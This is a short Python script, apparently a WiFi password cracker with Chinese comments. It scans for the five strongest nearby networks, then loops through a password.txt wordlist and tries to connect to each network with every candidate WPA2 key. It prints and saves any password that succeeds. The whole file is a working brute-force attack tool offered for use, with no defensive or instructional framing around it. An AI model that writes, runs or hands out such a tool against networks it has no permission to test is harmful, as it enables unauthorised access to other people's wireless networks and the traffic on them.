import pywifi
from pywifi import const  #引用一些定义
import time
namelist = []
ssidlist = []
result = []  #存放查询到的WIFI,密码
wificount = 5  #查询附近信号最强的5个WIFI，最多5个


def getwifi():
    wifi = pywifi.PyWiFi()  #抓取网卡接口
    ifaces = wifi.interfaces()[0]  #获取网卡
    ifaces.scan()
    time.sleep(8)
    bessis = ifaces.scan_results()
    list = []
    for data in bessis:
        if (data.ssid not in namelist):  #去掉重复的WIFI名称
            namelist.append(data.ssid)
            list.append((data.ssid, data.signal))
    sorted(list, key=lambda st: st[1], reverse=True)
    time.sleep(1)
    n = 0
    if len(list) is not 0:
        for item in list:
            if (item[0] not in ssidlist):
                n = n + 1
                if n <= wificount:
                    ssidlist.append(item[0])
    print(ssidlist)


def testwifi(ssidname, password):
    wifi = pywifi.PyWiFi()  #抓取网卡接口
    ifaces = wifi.interfaces()[0]  #获取网卡
    ifaces.disconnect()  #断开无限网卡连接
    profile = pywifi.Profile()  #创建wifi连接文件
    profile.ssid = ssidname  #定义wifissid
    profile.auth = const.AUTH_ALG_OPEN  #网卡的开放
    profile.akm.append(const.AKM_TYPE_WPA2PSK)  #wifi加密算法
    profile.cipher = const.CIPHER_TYPE_CCMP  ##加密单元
    profile.key = password  #wifi密码
    ifaces.remove_all_network_profiles()  #删除其他所有配置文件
    tmp_profile = ifaces.add_network_profile(profile)  #加载配置文件
    ifaces.connect(tmp_profile)  #连接wifi
    time.sleep(1)  #5秒内能否连接上
    if ifaces.status() == const.IFACE_CONNECTED:
        return True
    else:
        #print("[-]WiFi connection failure!")
        return False
    #ifaces.disconnect()#断开连接
    #time.sleep(1)
    return True


def main():
    getwifi()
    #ssidlist = ['Oun'] #如果知道WIFI直接写就行了。
    if (len(ssidlist) is not 0):
        path = r"password.txt"
        files = open(path, 'r')
        while True:
            if (len(ssidlist) is 0):
                break
            try:
                password = files.readline()
                password = password.strip('\n')
                if not password:
                    break
                for item in result:  #把已经找到密码的WIFI从查询中删除。
                    ssidlist.remove(item[0])
                for ssidname in ssidlist:
                    if (testwifi(ssidname, password) == True):
                        result.append((ssidname, password))  #把找到的WIFI密码保存起来
                        print('Succ', 'Current WifiName:', ssidname,
                              'Current Password:', password)
                    else:
                        print('Fail', 'Current WifiName:', ssidname,
                              'Current Password:', password)
            except:
                continue
        files.close()
        print("\n", "WIFI结果列表:")
        for item in result:  #把已经找到密码的WIFI从查询中删除。
            print("")
            print("无线:", item[0])
            print("密码:", item[1])
    else:
        print("没有找到WIFI信号，请重试。")


if __name__ == '__main__':
    main()
